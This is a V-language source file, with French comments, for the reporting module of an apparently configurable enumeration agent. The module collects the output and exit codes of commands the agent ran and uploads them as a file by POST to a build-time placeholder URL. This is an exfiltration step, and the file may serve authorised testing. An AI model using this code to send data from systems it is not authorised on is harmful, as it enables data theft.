net.http

// ------------------------------------------------------------------------- Module envoie
// Description	: Ce template du module d'envoi "api", créer simplement un couple header/output pour chaque Response
//				  Il va ensuite faire une POST request pour partager sa récolte sous forme de fichier
// Balise : 
//			- <!!url!!> : l'url target ou il envoi son rapport
//			- le nom du fichier peut aussi être changé si nécessaire, aucun balise n'est prévu puisque ce n'est pas vraiment utile
// Import :
//			- net.http
fn (shared sv SharedVariable) module_envoie() {
	dump_filename := 'agent_enumeration.txt' // argument modifiable à la compilation
	target_url := '<!!url!!>' // argument modifiable représentant l'url ciblé de transmission des l'énumération

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.started
    }

	mut s := ModuleState.unknown

	for {
		
		rlock sv.module_state {
			s = sv.module_state[Module.execution]
		}
		// dès que le module d'exécution se termine, on break
		if s == ModuleState.finish {
			break
		}

		time.sleep(10 * time.millisecond)
	}

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.running
    }

	mut final_enum_file := ""
	mut header := ""
	for i in 0..sv.response_list.len {

		header = sv.commandes_list[sv.response_list[i].index].id
		rlock sv {
			header += " "  + sv.response_list[i].exit_code.str()
			header += " " + (sv.response_list[i].output.count("\n") + 1).str() + "\n"
		}
		final_enum_file += header + sv.response_list[i].output + "\n"
	}
	final_enum_file = final_enum_file.trim_space()

	// une fois les données récolté, on envoie le tout à l'API :
	// la strucutre de donnée du fichier a envoyer
    mut files := []http.FileData{}
    
    // adding file to the array
    files << http.FileData {
        filename:        dump_filename,
        content_type:    "plain/text",
        data:            final_enum_file
    }

    // PostMultipartFormConfig struct
	cfg := http.PostMultipartFormConfig{
		form:{
			"id_agent": sv.agent_identifier
		},
		files: {
			"file":    files
		}
	}

    http.post_multipart_form(target_url, cfg) or {
		lock sv.module_state, sv.module_state_description {
        	sv.module_state[Module.envoie] = ModuleState.error
			sv.module_state_description[Module.envoie] = "Error during POST request :\n" + err.str()
    	}
		return
	}

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.finish
    }

}